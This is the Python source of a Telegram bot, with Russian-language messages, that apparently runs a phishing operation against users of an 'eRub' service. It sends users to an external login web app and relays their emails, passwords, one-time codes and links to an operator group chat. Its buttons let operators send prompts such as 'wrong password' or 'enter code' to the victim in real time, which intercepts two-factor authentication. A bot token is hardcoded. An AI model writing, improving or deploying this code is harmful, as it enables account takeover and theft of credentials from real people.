import os
import logging
import json
import requests
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==================== КОНФИГ ====================
BOT_TOKEN = "8828808036:AAFw0KZn5czy-OqhpwFkZEi8Ja3TcKxkfgE"
GROUP_CHAT_ID = -1004457031723  # ID группы (с минусом!)
WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp2/"
# ===============================================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_sessions = {}

class ErubBot:
    def __init__(self):
        self.application = Application.builder().token(BOT_TOKEN).build()
        self.setup_handlers()

    def setup_handlers(self):
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CallbackQueryHandler(self.handle_callback))
        self.application.add_handler(MessageHandler(filters.ALL, self.handle_all_messages))

    # ===== 1. /start =====
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = user.id
        first_name = user.first_name or "без имени"
        username = user.username or "нет"

        logger.info(f"👤 Пользователь {user_id} ({first_name}) запустил бота")

        # Уведомление в группу
        await self.application.bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                 f"👤 ID: `{user_id}`\n"
                 f"👤 Имя: {first_name}\n"
                 f"👤 Username: @{username}\n"
                 f"🕐 Время: {update.message.date.strftime('%d.%m.%Y %H:%M')}",
            parse_mode="Markdown"
        )

        keyboard = [[
            KeyboardButton(
                "🔑 Войти в систему",
                web_app=WebAppInfo(url=WEB_APP_URL)
            )
        ]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        await update.message.reply_text(
            f"👋 Привет, {first_name}!\n\nНажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.",
            reply_markup=reply_markup
        )

    # ===== 2. Обработка кнопок в группе =====
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data

        if data.startswith("wrong_"):
            user_id = int(data.split("_")[1])
            await self.application.bot.send_message(
                chat_id=user_id,
                text="❌ НЕПРАВИЛЬНЫЙ_ПАРОЛЬ"
            )
            await query.edit_message_text(
                f"✅ Уведомление отправлено пользователю {user_id}"
            )

        elif data.startswith("code_"):
            user_id = int(data.split("_")[1])
            await self.application.bot.send_message(
                chat_id=user_id,
                text="📧 ОТКРЫТЬ_ОКНО_КОДА"
            )
            await query.edit_message_text(
                f"✅ Запрос кода отправлен пользователю {user_id}"
            )

        elif data.startswith("link_"):
            user_id = int(data.split("_")[1])
            await self.application.bot.send_message(
                chat_id=user_id,
                text="🔗 ОТКРЫТЬ_ОКНО_ССЫЛКИ"
            )
            await query.edit_message_text(
                f"✅ Запрос ссылки отправлен пользователю {user_id}"
            )

    # ===== 3. Обработка всех сообщений =====
    async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message:
            return

        user_id = update.effective_user.id
        text = update.message.text
        chat_id = update.effective_chat.id

        # Если сообщение из группы — игнорируем
        if chat_id == GROUP_CHAT_ID:
            return

        # ===== Если сообщение от обычного пользователя =====
        if user_id != GROUP_CHAT_ID:
            # ---- Код ----
            if user_sessions.get(user_id, {}).get('awaiting_code'):
                await self.application.bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    text=f"📧 Код от {user_id}: `{text}`",
                    parse_mode="Markdown"
                )
                user_sessions[user_id]['awaiting_code'] = False
                await update.message.reply_text("✅ Отправлено")
                return

            # ---- Ссылка ----
            if user_sessions.get(user_id, {}).get('awaiting_link'):
                await self.application.bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    text=f"🔗 Ссылка от {user_id}: `{text}`",
                    parse_mode="Markdown"
                )
                user_sessions[user_id]['awaiting_link'] = False
                await update.message.reply_text("✅ Отправлено")
                return

            await update.message.reply_text("ℹ️ Используйте кнопку «Войти в систему»")
            return

        # ===== Если сообщение от администратора (JSON) =====
        if text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                target_user_id = data.get('user_id', user_id)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                link = data.get('link')

                # ---- Обычный вход ----
                if email and password and not code and not link:
                    # Кнопки для копирования
                    copy_email_btn = InlineKeyboardButton(
                        text="📧 Копировать почту",
                        copy_text=email
                    )
                    copy_pass_btn = InlineKeyboardButton(
                        text="🔑 Копировать пароль",
                        copy_text=password
                    )

                    keyboard = [
                        [copy_email_btn, copy_pass_btn],
                        [
                            InlineKeyboardButton("❌ Неправильный пароль", callback_data=f"wrong_{target_user_id}"),
                            InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}"),
                            InlineKeyboardButton("🔗 Ссылка", callback_data=f"link_{target_user_id}")
                        ]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    await self.application.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                             f"👤 ID: `{target_user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )

                # ---- Код ----
                elif code:
                    copy_code_btn = InlineKeyboardButton(
                        text="📋 Копировать код",
                        copy_text=code
                    )
                    keyboard = [[copy_code_btn]]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    await self.application.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"📧 Код от {target_user_id}: `{code}`",
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )

                # ---- Ссылка ----
                elif link:
                    copy_link_btn = InlineKeyboardButton(
                        text="🔗 Копировать ссылку",
                        copy_text=link
                    )
                    keyboard = [[copy_link_btn]]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    await self.application.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🔗 Ссылка от {target_user_id}: `{link}`",
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )

                # ---- E-ID вход ----
                elif data.get('type') == 'eid_login':
                    copy_email_btn = InlineKeyboardButton(
                        text="📧 Копировать почту",
                        copy_text=email
                    )
                    copy_pass_btn = InlineKeyboardButton(
                        text="🔑 Копировать пароль",
                        copy_text=password
                    )

                    keyboard = [
                        [copy_email_btn, copy_pass_btn],
                        [
                            InlineKeyboardButton("❌ Неправильный пароль", callback_data=f"wrong_{target_user_id}"),
                            InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}"),
                            InlineKeyboardButton("🔗 Ссылка", callback_data=f"link_{target_user_id}")
                        ]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    await self.application.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🆔 E-ID ВХОД\n\n"
                             f"👤 ID: `{target_user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )

            except Exception as e:
                logger.error(f"❌ Ошибка: {e}")
                await update.message.reply_text(f"❌ Ошибка: {e}")

    # ===== 4. ЗАПУСК С ПРИНУДИТЕЛЬНЫМ СБРОСОМ =====
    def run(self):
        # ===== ПРИНУДИТЕЛЬНОЕ ЗАВЕРШЕНИЕ ВСЕХ СТАРЫХ ПРОЦЕССОВ =====
        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=True')
            print("✅ Вебхук сброшен")
        except Exception as e:
            print(f"⚠️ Ошибка сброса вебхука: {e}")

        try:
            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&timeout=1')
            print("✅ Старые сессии завершены")
        except Exception as e:
            print(f"⚠️ Ошибка завершения сессий: {e}")

        time.sleep(1)

        print("=" * 50)
        print("🤖 БОТ ЗАПУЩЕН")
        print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
        print("=" * 50)

        self.application.run_polling()


if __name__ == "__main__":
    bot = ErubBot()
    bot.run()
